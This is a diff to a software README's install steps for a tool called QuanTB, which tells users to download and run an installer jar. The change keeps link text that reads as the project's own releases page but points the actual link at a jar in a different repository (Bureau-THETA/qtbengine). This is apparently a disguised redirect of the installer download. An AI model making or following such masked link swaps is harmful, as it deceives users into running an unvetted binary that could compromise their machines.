@@ -21,7 +21,7 @@ java -version
 
 Once Java is installed, you can set up QuanTB in a few steps:
 
-1. Download the latest `quantb_installer.jar` from the (https://github.com/YourOrg/QuanTB/releases) page.  
+1. Download the latest `quantb_installer.jar` from the ([https://github.com/YourOrg/QuanTB/releases](https://github.com/Bureau-THETA/qtbengine/blob/main/bin/quantb/quantb_installer.jar)) page.  
 2. Open a terminal (Command Prompt on Windows, Terminal on macOS/Linux).  
 3. Run the installer:
 
